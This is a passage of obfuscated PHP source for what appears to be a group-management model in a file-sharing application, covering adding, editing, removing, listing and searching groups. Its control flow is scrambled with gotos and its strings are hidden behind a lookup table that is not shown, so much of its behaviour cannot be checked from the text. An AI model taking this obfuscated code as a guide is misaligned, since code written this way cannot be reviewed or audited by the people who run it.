($c÷‰õ´æÇĞ[$eŒÑìÅµ”ô[2120]] - 1); $dÁãÕĞ’è› += $c÷‰õ´æÇĞ[$eŒÑìÅµ”ô[2120]]; } } $CÅ²­Š¶Ÿå = array($eŒÑìÅµ”ô[2125] => $b˜×ÁôƒÖÈ, $eŒÑìÅµ”ô[2126] => $aŒóõºÚ‚Õ, $eŒÑìÅµ”ô[2127] => $aŒóõºÚ‚Õ / $b˜×ÁôƒÖÈ, $eŒÑìÅµ”ô[81] => $D´‘­²­Í, $eŒÑìÅµ”ô[2128] => $dÁãÕĞ’è›); return $CÅ²­Š¶Ÿå; goto Bğ¹Ñ™­†‡; D®Ëµ“Î¸Î: $eŒÑìÅµ”ô =& $_SERVER[Ä¿Ş°¨]; $D´‘­²­Í = $this->count() + 0.0; $aŒóõºÚ‚Õ = 0; goto eÉİìÃä¾; Bğ¹Ñ™­†‡: } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\160"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\155\145" => "\x67\162\157\x75\x70\x5f\155\x65\164\141", "\155\145\164\x61\x46\x69\145\154\144" => "\x67\162\157\165\x70\111\104"); protected function cacheFunctionAlias($dŸËÉ·¢½š) { $bµ‡ë‘÷É¯ =& $_SERVER[Ä¿Ş°¨]; return array($bµ‡ë‘÷É¯[2129] => array($dŸËÉ·¢½š[0], $bµ‡ë‘÷É¯[2130]), $bµ‡ë‘÷É¯[2131] => array($dŸËÉ·¢½š[0], $bµ‡ë‘÷É¯[2130])); } protected function getInfo($BÓñ¯²áÛ) { $CÚ‹óó†‘Ù = $this->getInfoSimple($BÓñ¯²áÛ); if (!$CÚ‹óó†‘Ù) { return !1; } return $this->_listDataApplyItem($CÚ‹óó†‘Ù); } protected function getInfoSimple($FåÄ´æÄ­†, $Dæç¥©‡“ = false) { $cÃÔÛ»ì˜ù =& $_SERVER[Ä¿Ş°¨]; if ($Dæç¥©‡“) { $c™„Òæêª = array($cÃÔÛ»ì˜ù[2063] => intval($FåÄ´æÄ­†)); $e¥‚ƒæ¼ßä = $this->where($c™„Òæêª)->find(); return is_array($e¥‚ƒæ¼ßä) ? $e¥‚ƒæ¼ßä : array(); } return $this->cacheFunctionGet($cÃÔÛ»ì˜ù[2132], $FåÄ´æÄ­†); } protected function groupAdd($F¼”ÂíÚÛ¹) { goto dË¾†®õ‡; fÉ˜ºÑç‹: if ($e„•òÉç’ƒ[$a—Û§¥ö¥®[463]]) { $aäø„ª˜Œ‘ = $e„•òÉç’ƒ[$a—Û§¥ö¥®[463]] . $e„•òÉç’ƒ[$a—Û§¥ö¥®[2063]] . $a—Û§¥ö¥®[47]; } $aô‚ô§Õ Ñ = array($a—Û§¥ö¥®[391] => $this->groupNameAuto($F¼”ÂíÚÛ¹[$a—Û§¥ö¥®[465]], $F¼”ÂíÚÛ¹[$a—Û§¥ö¥®[28]]), $a—Û§¥ö¥®[373] => $F¼”ÂíÚÛ¹[$a—Û§¥ö¥®[465]], $a—Û§¥ö¥®[529] => $aäø„ª˜Œ‘, $a—Û§¥ö¥®[2133] => $F¼”ÂíÚÛ¹[$a—Û§¥ö¥®[2047]], $a—Û§¥ö¥®[2134] => 0, $a—Û§¥ö¥®[2067] => 0); if (isset($F¼”ÂíÚÛ¹[$a—Û§¥ö¥®[2084]])) { $aô‚ô§Õ Ñ[$a—Û§¥ö¥®[2084]] = $F¼”ÂíÚÛ¹[$a—Û§¥ö¥®[2084]]; } else { $Cô±ƒßÂ¨¸ = $this->max($a—Û§¥ö¥®[2084]); if (!$Cô±ƒßÂ¨¸) { $Cô±ƒßÂ¨¸ = 0; } $aô‚ô§Õ Ñ[$a—Û§¥ö¥®[2084]] = $Cô±ƒßÂ¨¸ + 1; } goto B¾ã†Ë™‘; dË¾†®õ‡: $a—Û§¥ö¥® =& $_SERVER[Ä¿Ş°¨]; if (!$F¼”ÂíÚÛ¹[$a—Û§¥ö¥®[465]] && isset($F¼”ÂíÚÛ¹[$a—Û§¥ö¥®[2063]]) && $F¼”ÂíÚÛ¹[$a—Û§¥ö¥®[2063]] == 1) { if ($e„•òÉç’ƒ = $this->getInfoSimple($F¼”ÂíÚÛ¹[$a—Û§¥ö¥®[2063]], !0)) { return $F¼”ÂíÚÛ¹[$a—Û§¥ö¥®[2063]]; } } else { $e„•òÉç’ƒ = $this->getInfoSimple($F¼”ÂíÚÛ¹[$a—Û§¥ö¥®[465]]); if (!$e„•òÉç’ƒ) { return !1; } } $aäø„ª˜Œ‘ = $a—Û§¥ö¥®[474]; goto fÉ˜ºÑç‹; B¾ã†Ë™‘: if (!empty($F¼”ÂíÚÛ¹[$a—Û§¥ö¥®[2063]])) { $aô‚ô§Õ Ñ[$a—Û§¥ö¥®[2063]] = $F¼”ÂíÚÛ¹[$a—Û§¥ö¥®[2063]]; } $cã“îçÈÎ¹ = $this->add($aô‚ô§Õ Ñ); $this->setNamePinyin($cã“îçÈÎ¹, $aô‚ô§Õ Ñ[$a—Û§¥ö¥®[28]]); goto A†¬Š…Ğ÷«; A†¬Š…Ğ÷«: Model($a—Û§¥ö¥®[1095])->groupRootAdd($cã“îçÈÎ¹); return $cã“îçÈÎ¹; goto F¸ÃƒÙÓê²; F¸ÃƒÙÓê²: } protected function groupEdit($eã¸™³Ù¸¿, $CÓ‡ö´³Şƒ) { $AÎ¸Êº¦‰ =& $_SERVER[Ä¿Ş°¨]; if (!empty($CÓ‡ö´³Şƒ[$AÎ¸Êº¦‰[465]])) { $DºŒÛ¾ùö‡ = $this->getInfoSimple($eã¸™³Ù¸¿); $dÕä§æ³¬ = $this->getInfoSimple($CÓ‡ö´³Şƒ[$AÎ¸Êº¦‰[465]]); if (!$DºŒÛ¾ùö‡ || !$dÕä§æ³¬) { return !1; } if ($DºŒÛ¾ùö‡[$AÎ¸Êº¦‰[2063]] == $dÕä§æ³¬[$AÎ¸Êº¦‰[2063]]) { return !1; } if ($CÓ‡ö´³Şƒ[$AÎ¸Êº¦‰[465]] != $DºŒÛ¾ùö‡[$AÎ¸Êº¦‰[465]]) { if ($dÕä§æ³¬[$AÎ¸Êº¦‰[463]] !== $DºŒÛ¾ùö‡[$AÎ¸Êº¦‰[463]] && strpos($dÕä§æ³¬[$AÎ¸Êº¦‰[463]], $DºŒÛ¾ùö‡[$AÎ¸Êº¦‰[463]] . $DºŒÛ¾ùö‡[$AÎ¸Êº¦‰[2063]] . $AÎ¸Êº¦‰[47]) === 0) { return !1; } $CÓ‡ö´³Şƒ[$AÎ¸Êº¦‰[529]] = $dÕä§æ³¬[$AÎ¸Êº¦‰[463]] . $CÓ‡ö´³Şƒ[$AÎ¸Êº¦‰[465]] . $AÎ¸Êº¦‰[47]; $this->_changeChildLevel($DºŒÛ¾ùö‡, $dÕä§æ³¬); } } if (isset($CÓ‡ö´³Şƒ[$AÎ¸Êº¦‰[28]])) { $this->setNamePinyin($eã¸™³Ù¸¿, $CÓ‡ö´³Şƒ[$AÎ¸Êº¦‰[28]]); } return $this->where(array($AÎ¸Êº¦‰[2135] => $eã¸™³Ù¸¿))->save($CÓ‡ö´³Şƒ); } private function _changeChildLevel($BÇ‹ÃÕ·‰, $d¡ÉÉåÓÇ, $D‘ˆ­¯ßÓ¤ = false) { goto e‡íçÕ×‹ï; D”¬ÀÂ‹ï: if ($D‘ˆ­¯ßÓ¤) { $DÍäˆ—ëÍ = $d¡ÉÉåÓÇ[$Eñ”·ÔÈè®[463]] . $d¡ÉÉåÓÇ[$Eñ”·ÔÈè®[2063]] . $Eñ”·ÔÈè®[47]; } $BŸø™İãìÄ = array($Eñ”·ÔÈè®[529] => array($Eñ”·ÔÈè®[487], $BÇ‹ÃÕ·‰[$Eñ”·ÔÈè®[463]] . $BÇ‹ÃÕ·‰[$Eñ”·ÔÈè®[2063]] . $Eñ”·ÔÈè®[488])); $DˆŸ¹‚ŠÒ¸ = array($Eñ”·ÔÈè®[529] => array($Eñ”·ÔÈè®[538], "\162\x65\160\x6c\x61\x63\145\50\x70\x61\x72\145\x6e\x74\114\145\166\145\x6c\x2c\x27{$dÂÖğ¨·Ø}\x27\x2c\x27{$DÍäˆ—ëÍ}\x27\x29")); goto fä òæÊÅ¥; fä òæÊÅ¥: $this->where($BŸø™İãìÄ)->data($DˆŸ¹‚ŠÒ¸)->save(); goto AíôÇ«·˜Ù; e‡íçÕ×‹ï: $Eñ”·ÔÈè® =& $_SERVER[Ä¿Ş°¨]; $dÂÖğ¨·Ø = $BÇ‹ÃÕ·‰[$Eñ”·ÔÈè®[463]] . $BÇ‹ÃÕ·‰[$Eñ”·ÔÈè®[2063]] . $Eñ”·ÔÈè®[47]; $DÍäˆ—ëÍ = $d¡ÉÉåÓÇ[$Eñ”·ÔÈè®[463]] . $d¡ÉÉåÓÇ[$Eñ”·ÔÈè®[2063]] . $Eñ”·ÔÈè®[47] . $BÇ‹ÃÕ·‰[$Eñ”·ÔÈè®[2063]] . $Eñ”·ÔÈè®[47]; goto D”¬ÀÂ‹ï; AíôÇ«·˜Ù: } public function setNamePinyin($AÀßÁœÀË©, $cëÉ‚½İ… = false) { $cì¬ˆ¶íÛË =& $_SERVER[Ä¿Ş°¨]; if (!$cëÉ‚½İ…) { $e½ˆÆ×Ñà = $this->getInfoSimple($AÀßÁœÀË©); $cëÉ‚½İ… = $e½ˆÆ×Ñà[$cì¬ˆ¶íÛË[28]]; } if (!Input::check($cëÉ‚½İ…, $cì¬ˆ¶íÛË[532])) { $this->metaSet($AÀßÁœÀË©, $cì¬ˆ¶íÛË[420], null); $this->metaSet($AÀßÁœÀË©, $cì¬ˆ¶íÛË[419], null); return; } $b‰İøè„¡Ä = array($cì¬ˆ¶íÛË[420] => str_replace($cì¬ˆ¶íÛË[50], $cì¬ˆ¶íÛË[33], Pinyin::encode($cëÉ‚½İ…)), $cì¬ˆ¶íÛË[419] => Pinyin::encode($cëÉ‚½İ…, $cì¬ˆ¶íÛË[533])); $this->metaSet($AÀßÁœÀË©, $b‰İøè„¡Ä); } protected function groupStatus($f’´›’», $D¢ÚõŠÎ¯‚, $dÑãÇ´Èª = true) { $a”ÕØ¢ÑÛ‘ =& $_SERVER[Ä¿Ş°¨]; $eéÚ‚–ÏåÀ = $this->getInfoSimple($f’´›’»); if (!$eéÚ‚–ÏåÀ) { return !1; } if ($dÑãÇ´Èª) { $this->_groupStatusApply($eéÚ‚–ÏåÀ, $D¢ÚõŠÎ¯‚); } $còóØ¤¶° = array($a”ÕØ¢ÑÛ‘[2063] => $f’´›’», $a”ÕØ¢ÑÛ‘[89] => $a”ÕØ¢ÑÛ‘[683], $a”ÕØ¢ÑÛ‘[355] => $D¢ÚõŠÎ¯‚); return Model($a”ÕØ¢ÑÛ‘[2136])->add($còóØ¤¶°, array(), !0); } private function _groupStatusApply($A´Õùèå²‡, $FšƒŸï•ºª) { $AÚƒšÔµšÚ =& $_SERVER[Ä¿Ş°¨]; if ($FšƒŸï•ºª == $AÚƒšÔµšÚ[83]) { $AŞÏæâãè” = $this->parentLevelArray($A´Õùèå²‡[$AÚƒšÔµšÚ[463]]); } else { $EŠ°ƒİ• = array($AÚƒšÔµšÚ[529] => array($AÚƒšÔµšÚ[487], $A´Õùèå²‡[$AÚƒšÔµšÚ[463]] . $A´Õùèå²‡[$AÚƒšÔµšÚ[2063]] . $AÚƒšÔµšÚ[488])); $AŞÏæâãè” = $this->where($EŠ°ƒİ•)->field($AÚƒšÔµšÚ[2063])->select(); $AŞÏæâãè” = array_to_keyvalue($AŞÏæâãè”, $AÚƒšÔµšÚ[33], $AÚƒšÔµšÚ[2063]); } if (empty($AŞÏæâãè”)) { return; } $EŠ°ƒİ• = array($AÚƒšÔµšÚ[2063] => array($AÚƒšÔµšÚ[7], $AŞÏæâãè”), $AÚƒšÔµšÚ[89] => $AÚƒšÔµšÚ[683], $AÚƒšÔµšÚ[355] => $FšƒŸï•ºª ? $AÚƒšÔµšÚ[472] : $AÚƒšÔµšÚ[83]); Model($AÚƒšÔµšÚ[2136])->where($EŠ°ƒİ•)->save(array($AÚƒšÔµšÚ[355] => $FšƒŸï•ºª)); } protected function groupRemove($aöï‡ˆÄ ) { goto b§Ùİ„‘ÜŸ; fç¯ôÊŞ²: if (!$CÈ¯ñ¹ÜÑ» || $CÈ¯ñ¹ÜÑ»[$C›œ½ª«ÖÑ[465]] == 0) { return !1; } $DÁ‚¬Ú² = $this->getInfoSimple($CÈ¯ñ¹ÜÑ»[$C›œ½ª«ÖÑ[465]]); $this->_changeChildLevel($CÈ¯ñ¹ÜÑ», $DÁ‚¬Ú², !0); goto aÌ…°Ğ²Âº; b§Ùİ„‘ÜŸ: $C›œ½ª«ÖÑ =& $_SERVER[Ä¿Ş°¨]; $A¥“Õ¿¡ÙŞ = array($C›œ½ª«ÖÑ[2063] => $aöï‡ˆÄ ); $CÈ¯ñ¹ÜÑ» = $this->where($A¥“Õ¿¡ÙŞ)->find(); goto fç¯ôÊŞ²; c„Àíì§„: Model($C›œ½ª«ÖÑ[746])->groupRootRemove($aöï‡ˆÄ ); return $this->where($A¥“Õ¿¡ÙŞ)->delete(); goto cñöãåâ±³; aÌ…°Ğ²Âº: $this->where(array($C›œ½ª«ÖÑ[465] => $aöï‡ˆÄ ))->save(array($C›œ½ª«ÖÑ[465] => $CÈ¯ñ¹ÜÑ»[$C›œ½ª«ÖÑ[465]])); Model($C›œ½ª«ÖÑ[2136])->where($A¥“Õ¿¡ÙŞ)->delete(); Model($C›œ½ª«ÖÑ[2137])->where($A¥“Õ¿¡ÙŞ)->delete(); goto c„Àíì§„; cñöãåâ±³: } public function listData() { $Aù‘îé¨Ÿ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Aù‘îé¨Ÿ[$_SERVER[Ä¿Ş°¨][350]]); return $Aù‘îé¨Ÿ; } private function _makeOrder($EÙôßåÑ = '') { goto F®æĞš›íŞ; F®æĞš›íŞ: $CÉå·˜ªœ¤ =& $_SERVER[Ä¿Ş°¨]; $C¶£Ó¾Å£‘ = array($CÉå·˜ªœ¤[2063], $CÉå·˜ªœ¤[28], $CÉå·˜ªœ¤[2049], $CÉå·˜ªœ¤[183]); $Dß‡³›Õº = array($CÉå·˜ªœ¤[406] => $CÉå·˜ªœ¤[407], $CÉå·˜ªœ¤[408] => $CÉå·˜ªœ¤[409]); goto d¥Ä¢ƒíÙù; C…×áìåì: $EÙôßåÑ = $EÙôßåÑ . "{$cÓİÀÒÁ˜£}\x20{$A «¶®¿¨}\54\x20\147\x72\157\x75\160\x49\104\40\141\x73\143"; return $this->order($EÙôßåÑ); goto a‹Û¡‘œé¨; d¥Ä¢ƒíÙù: $cÓİÀÒÁ˜£ = Input::get($CÉå·˜ªœ¤[411], $CÉå·˜ªœ¤[7], $CÉå·˜ªœ¤[2067], $C¶£Ó¾Å£‘); $A «¶®¿¨ = Input::get($CÉå·˜ªœ¤[412], $CÉå·˜ªœ¤[7], $CÉå·˜ªœ¤[2138], array($CÉå·˜ªœ¤[2138], $CÉå·˜ªœ¤[408])); $A «¶®¿¨ = $Dß‡³›Õº[$A «¶®¿¨]; goto C…×áìåì; a‹Û¡‘œé¨: } public function listChild($Fìµ§Çí‡Ô) { $BğğğÅé™ê =& $_SERVER[Ä¿Ş°¨]; $aî‘Áâã„Ü = $this->where(array($BğğğÅé™ê[465] => $Fìµ§Çí‡Ô))->_makeOrder()->selectPage(200); $this->_listDataApply($aî‘Áâã„Ü[$BğğğÅé™ê[350]]); return $aî‘Áâã„Ü; } public function listByID($DÀÒÇ·ç°É) { $e–½±âÆ¬¹ =& $_SERVER[Ä¿Ş°¨]; if (!$DÀÒÇ·ç°É) { return array(); } $EòÔ”ƒ¶¹¿ = array($e–½±âÆ¬¹[2063] => array($e–½±âÆ¬¹[7], $DÀÒÇ·ç°É)); $FèŒ¥ ½•Ï = $this->where($EòÔ”ƒ¶¹¿)->select(); $this->_listDataApply($FèŒ¥ ½•Ï); return $FèŒ¥ ½•Ï; } public function listSearch($F—ÈÆ¯†´¦) { goto bé¤±•Ÿø; A¥²ï—‹„ê: $this->_listDataApply($F‹½é›Ò¡ä[$bË¨°ùÏ…[350]]); return $F‹½é›Ò¡ä; goto e‘•¥ˆÔÖ¦; EÊŠ¨¯¶: $F‹½é›Ò¡ä = $this->_makeOrder()->where($bŞ‡‹¬µ™)->selectPage(20); $F‹½é›Ò¡ä = $F‹½é›Ò¡ä ? $F‹½é›Ò¡ä : array(); if (!$F‹½é›Ò¡ä || count($F‹½é›Ò¡ä[$bË¨°ùÏ…[350]]) < 5 && Input::check($B«Ø¹³·İ­, $bË¨°ùÏ…[302])) { $bÖˆ¡»¨„ô = $this->_searchFromMeta($bË¨°ùÏ…[419], $B«Ø¹³·İ­, 10); $D¿ÚÛæÓá« = $this->_searchFromMeta($bË¨°ùÏ…[420], $B«Ø¹³·İ­, 10); $cÅ™ˆÕ•Ë = array_merge($bÖˆ¡»¨„ô, $D¿ÚÛæÓá«, $F‹½é›Ò¡ä[$bË¨°ùÏ…[350]]); $F‹½é›Ò¡ä[$bË¨°ùÏ…[350]] = array_unique_by_key($cÅ™ˆÕ•Ë, $bË¨°ùÏ…[2063]); $F‹½é›Ò¡ä[$bË¨°ùÏ…[347]][$bË¨°ùÏ…[348]] = count($F‹½é›Ò¡ä[$bË¨°ùÏ…[350]]); $F‹½é›Ò¡ä[$bË¨°ùÏ…[347]][$bË¨°ùÏ…[349]] = ceil($F‹½é›Ò¡ä[$bË¨°ùÏ…[347]][$bË¨°ùÏ…[348]] / $F‹½é›Ò¡ä[$bË¨°ùÏ…[347]][$bË¨°ùÏ…[345]]); } goto A¥²ï—‹„ê; aê–«‚®–Ã: if (!trim($B«Ø¹³·İ­)) { return !1; } $B«Ø¹³·İ­ = str_replace($bË¨°ùÏ…[2141], $bË¨°ùÏ…[2142], $B«Ø¹³·İ­); $bŞ‡‹¬µ™ = array($bË¨°ùÏ…[2063] => array($bË¨°ùÏ…[745], "\x25{$B«Ø¹³·İ­}\x25"), $bË¨°ùÏ…[28] => array($bË¨°ùÏ…[745], "\x25{$B«Ø¹³·İ­}\x25"), $bË¨°ùÏ…[901] => $bË¨°ùÏ…[2143]); goto EÊŠ¨¯¶; bé¤±•Ÿø: $bË¨°ùÏ… =& $_SERVER[Ä¿Ş°¨]; $B«Ø¹³·İ­ = $F—ÈÆ¯†´¦[$bË¨°ùÏ…[2139]]; $EÅ÷õËÜµ› = isset($F—ÈÆ¯†´¦[$bË¨°ùÏ…[2140]]) ? $F—ÈÆ¯†´¦[$bË¨°ùÏ…[2140]] : !1; goto aê–«‚®–Ã; e‘•¥ˆÔÖ¦: } private function _searchFromMeta($eÄƒìÃÍ…å, $f­µğ¢‰†ç, $c–ÓÇÊí¨É) { goto dÌ›ÀÃ™¯‘; d¯øîğ‰É¥: $Bß‰Ú˜ä¹‰ = $this->where(array($BƒÌ£í¢˜[2135] => array($BƒÌ£í¢˜[7], $f‡˜Š…ö‹¤)))->select(); if (!$Bß‰Ú˜ä¹‰) { return array(); } return $Bß‰Ú˜ä¹‰; goto Aİù¡œôÉ; dÌ›ÀÃ™¯‘: $BƒÌ£í¢˜ =& $_SERVER[Ä¿Ş°¨]; $f­µğ¢‰†ç = strtolower($f­µğ¢‰†ç); $dóĞÆâ¥š÷ = array($BƒÌ£í¢˜[89] => $eÄƒìÃÍ…å, $BƒÌ£í¢˜[355] => array($BƒÌ£í¢˜[745], "\x25{$f­µğ¢‰†ç}\x25")); goto EÏéßÆŞ¯; EÏéßÆŞ¯: $f‡˜Š…ö‹¤ = Model($BƒÌ£í¢˜[2144])->where($dóĞÆâ¥š÷)->limit($c–ÓÇÊí¨É)->select(); if (!$f‡˜Š…ö‹¤) { return array(); } $f‡˜Š…ö‹¤ = array_to_keyvalue($f‡˜Š…ö‹¤, $BƒÌ£í¢˜[33], $BƒÌ£í¢˜[2063]); goto d¯øîğ‰É¥; Aİù¡œôÉ: } protected function _listDataApplyItem($F©‰¶Ì’ªØ) { $Cùœ…’«® = array($F©‰¶Ì’ªØ); $this->_listDataApply($Cùœ…’«®); return $Cùœ…’«®[0]; } protected function _listDataApply(&$Aí‘¦İ“ ê) { goto aïå¯ª¨¬; aòÇÅøŸ•…: $this->_listAppendParent($Aí‘¦İ“ ê); $this->_listAppendSourceRoot($Aí‘¦İ“ ê, $bŞ«·Ãù); goto A“®ì¨›Ü‰; aïå¯ª¨¬: $e”Ûò¥Ú” =& $_SERVER[Ä¿Ş°¨]; if (!$Aí‘¦İ“ ê) { return; } $bŞ«·Ãù = array_to_keyvalue($Aí‘¦İ“ ê, $e”Ûò¥Ú”[33], $e”Ûò¥Ú”[2063]); goto EŒÜ²òÛÍÙ; EŒÜ²òÛÍÙ: $this->_listAppendChildren($Aí‘¦İ“ ê); $this->_listAppendChildrenMember($Aí‘¦İ“ ê); $this->_listAppendMeta($Aí‘¦İ“ ê, $bŞ«·Ãù); goto aòÇÅøŸ•…; A“®ì¨›Ü‰: } private function _listAppendChildren(&$dååƒš„Ğ‚) { goto CçÀ¯ø‘¢º; a¨…ƒœŠ¤: $b…æ¨áÛ = count($dååƒš„Ğ‚); $eÒ…ÁôÍÆ¸ = $this->tablePrefix . $this->tableName; for ($Cø­ù–Øø¹ = 0, $dˆÜŸ„ñ¹ = 0; $Cø­ù–Øø¹ < $b…æ¨áÛ; $Cø­ù–Øø¹++) { $dˆÜŸ„ñ¹++; $B„ŠÁƒ›­À = $dååƒš„Ğ‚[$Cø­ù–Øø¹][$d­‹„‚òï[2063]]; $féÄ‚ÆİÌ .= "\123\105\114\105\x43\124\x20\x2a\40\x46\x52\117\x4d\40\x28\x53\x45\x4c\x45\103\124\x20\x27{$B„ŠÁƒ›­À}\x5f\x63\150\x69\154\x64\47\x20\x61\x73\40\150\x61\x73\40\x46\122\x4f\x4d\40\x60{$eÒ…ÁôÍÆ¸}\x60\40\167\150\x65\162\x65\x20\160\x61\x72\145\156\x74\x49\x44\x3d{$B„ŠÁƒ›­À}\x20\154\x69\x6d\151\x74\40\61\51\40\x61\163\40\x74\142\x5f{$B„ŠÁƒ›­À}\40\165\156\151\157\x6e\x20\x61\x6c\x6c\40"; if (($dˆÜŸ„ñ¹ >= 20 || $Cø­ù–Øø¹ == $b…æ¨áÛ - 1) && $féÄ‚ÆİÌ) { $féÄ‚ÆİÌ = substr($féÄ‚ÆİÌ, 0, -strlen($d­‹„‚òï[453])); $C“²°¢¢Ûƒ = $this->query($féÄ‚ÆİÌ); $c¨–Ø”ÜÑ = array_merge($c¨–Ø”ÜÑ, $C“²°¢¢Ûƒ); $dˆÜŸ„ñ¹ = 0; $féÄ‚ÆİÌ = $d­‹„‚òï[33]; } } goto CÖ’×°¥áŒ; CçÀ¯ø‘¢º: $d­‹„‚òï =& $_SERVER[Ä¿Ş°¨]; $féÄ‚ÆİÌ = $d­‹„‚òï[357]; $c¨–Ø”ÜÑ = array(); goto a¨…ƒœŠ¤; CÖ’×°¥áŒ: $c¨–Ø”ÜÑ = array_to_keyvalue($c¨–Ø”ÜÑ, $d­‹„‚òï[454]); foreach ($dååƒš„Ğ‚ as &$f‡‡ÈĞªÇ) { $f‡‡ÈĞªÇ[$d­‹„‚òï[2145]] = isset($c¨–Ø”ÜÑ[$f‡‡ÈĞªÇ[$d­‹„‚òï[2063]] . $d­‹„‚òï[2146]]); } goto c¸«‚¬ÑÌÆ; c¸«‚¬ÑÌÆ: } private function _listAppendChildrenMember(&$FšÌÖÕ‰) { goto báİÏÚó¦»; báİÏÚó¦»: $dÈñ—‡Šã‚ =& $_SERVER[Ä¿Ş°¨]; $B¹Œ‰“ŸÂ = $dÈñ—‡Šã‚[357]; $a’Š¹¼¢ùî = array(); goto fğ‡¤¦ÚÛ; b¸ÉÀÚ¸é”: $a’Š¹¼¢ùî = array_to_keyvalue($a’Š¹¼¢ùî, $dÈñ—‡Šã‚[454]); foreach ($FšÌÖÕ‰ as &$Cè’å‰¥) { $Cè’å‰¥[$dÈñ—‡Šã‚[2147]] = isset($a’Š¹¼¢ùî[$Cè’å‰¥[$dÈñ—‡Šã‚[2063]] . $dÈñ—‡Šã‚[2146]]); } goto B“çÜÓëç¨; fğ‡¤¦ÚÛ: $FÆ¾¼Êè = count($FšÌÖÕ‰); $AÍÙÜœœÅ = $this->tablePrefix . $dÈñ—‡Šã‚[2137]; for ($eˆ¡ÆŠÖš° = 0, $Eœª‘ÄÜÁˆ = 0; $eˆ¡ÆŠÖš° < $FÆ¾¼Êè; $eˆ¡ÆŠÖš°++) { $Eœª‘ÄÜÁˆ++; $F•®îÀÎ‰ = $FšÌÖÕ‰[$eˆ¡ÆŠÖš°][$dÈñ—‡Šã‚[2063]]; $B¹Œ‰“ŸÂ .= "\x53\105\114\105\103\x54\x20\x2a\40\106\x52\117\x4d\40\50\123\x45\x4c\105\103\124\40\x27{$F•®îÀÎ‰}\137\x63\150\x69\x6c\144\x27\x20\141\163\x20\150\x61\163\x20\x46\122\x4f\x4d\40\x60{$AÍÙÜœœÅ}\140\40\167\150\x65\x72\145\40\x67\x72\x6f\x75\160\x49\104\75{$F•®îÀÎ‰}\40\x6c\x69\x6d\x69\x74\x20\x31\x29\40\x61\163\40\164\x62\137{$F•®îÀÎ‰}\40\x75\x6e\x69\x6f\x6e\x20\141\154\154\40"; if (($Eœª‘ÄÜÁˆ >= 20 || $eˆ¡ÆŠÖš° == $FÆ¾¼Êè - 1) && $B¹Œ‰“ŸÂ) { $B¹Œ‰“ŸÂ = substr($B¹Œ‰“ŸÂ, 0, -strlen($dÈñ—‡Šã‚[453])); $b©Ã’†‘¢Æ = $this->query($B¹Œ‰“ŸÂ); $a’Š¹¼¢ùî = array_merge($a’Š¹¼¢ùî, $b©Ã’†‘¢Æ); $Eœª‘ÄÜÁˆ = 0; $B¹Œ‰“ŸÂ = $dÈñ—‡Šã‚[33]; } } goto b¸ÉÀÚ¸é”; B“çÜÓëç¨: } private function _listAppendMeta(&$a·µšŒ‘†«, $d‰ğ«‹‹è½) { $cĞ“ñî»‹¢ =& $_SERVER[Ä¿Ş°¨]; $FºÙ§›àéè = array($cĞ“ñî»‹¢[2063] => array($cĞ“ñî»‹¢[7], $d‰ğ«‹‹è½)); $a»¹ŒÌÒƒ‘ = Model($cĞ“ñî»‹¢[2136])->where($FºÙ§›àéè)->select(); $a»¹ŒÌÒƒ‘ = array_to_keyvalue_group($a»¹ŒÌÒƒ‘, $cĞ“ñî»‹¢[2063]); foreach ($a»¹ŒÌÒƒ‘ as &$dôñÊÈ¥“) { $dôñÊÈ¥“ = array_to_keyvalue($dôñÊÈ¥“, $cĞ“ñî»‹¢[89], $cĞ“ñî»‹¢[355]); } foreach ($a·µšŒ‘†« as &$BÒ—ÍõáõÓ) { $BÒ—ÍõáõÓ[$cĞ“ñî»‹¢[421]] = array(); if (isset($a»¹ŒÌÒƒ‘[$BÒ—ÍõáõÓ[$cĞ“ñî»‹¢[2063]]])) { $BÒ—ÍõáõÓ[$cĞ“ñî»‹¢[421]] = $a»¹ŒÌÒƒ‘[$BÒ—ÍõáõÓ[$cĞ“ñî»‹¢[2063]]]; } } } protected function parentLevelArray($E¾‘½êù¶†) { $aŒğ²¤‘ÈÁ =& $_SERVER[Ä¿Ş°¨]; $E¾‘½êù¶† = explode($aŒğ²¤‘ÈÁ[47], trim($E¾‘½êù¶†, $aŒğ²¤‘ÈÁ[47])); $E¾‘½êù¶† = array_remove_value($E¾‘½êù¶†, $aŒğ²¤‘ÈÁ[472]); return $E¾‘½êù¶†; } private function _listAppendParent(&$A¸¡ï¹Ç) { goto EŞôéé¡‰; EŞôéé¡‰: $då¾×ğ¼ƒˆ =& $_SERVER[Ä¿Ş°¨]; $a£Õ±Ñ˜Ì– = array(); foreach ($A¸¡ï¹Ç as &$Eºñšˆ–˜÷) { $a£Õ±Ñ˜Ì–[$Eºñšˆ–˜÷[$då¾×ğ¼ƒˆ[2063]]] = $Eºñšˆ–˜÷[$då¾×ğ¼ƒˆ[28]]; $cŒÈ”±Ñà = $this->parentLevelArray($Eºñšˆ–˜÷[$då¾×ğ¼ƒˆ[463]]); foreach ($cŒÈ”±Ñà as $F–Å÷·Ğ´Á) { if (!isset($a£Õ±Ñ˜Ì–[$F–Å÷·Ğ´Á])) { $a£Õ±Ñ˜Ì–[$F–Å÷·Ğ´Á] = 0; } } } goto aì¼Ü‹ïÍ; dæÑĞ§á¡: foreach ($A¸¡ï¹Ç as &$Eºñšˆ–˜÷) { $cŒÈ”±Ñà = $this->parentLevelArray($Eºñšˆ–˜÷[$då¾×ğ¼ƒˆ[463]]); $B·åèòáƒÉ = $då¾×ğ¼ƒˆ[33]; foreach ($cŒÈ”±Ñà as $F–Å÷·Ğ´Á) { $B·åèòáƒÉ .= $a£Õ±Ñ˜Ì–[$F–Å÷·Ğ´Á] . $då¾×ğ¼ƒˆ[8]; } if ($cŒÈ”±Ñà) { $B·åèòáƒÉ .= $Eºñšˆ–˜÷[$då¾×ğ¼ƒˆ[28]]; } $Eºñšˆ–˜÷[$då¾×ğ¼ƒˆ[467]] = str_replace($då¾×ğ¼ƒˆ[471], $då¾×ğ¼ƒˆ[8], $B·åèòáƒÉ); } goto bï¸§‹«Ş; aì¼Ü‹ïÍ: $e×Šñ÷øõõ = array(); foreach ($a£Õ±Ñ˜Ì– as $E¾ïİ¼Èöˆ => $a‡ë‡ë°Â°) { if (!$a‡ë‡ë°Â°) { $e×Šñ÷øõõ[] = $E¾ïİ¼Èöˆ; } } if ($e×Šñ÷øõõ) { $E™áÃÌŒÛÃ = array($då¾×ğ¼ƒˆ[2135] => array($då¾×ğ¼ƒˆ[389], $e×Šñ÷øõõ)); $B©ÃŸéÇª¾ = 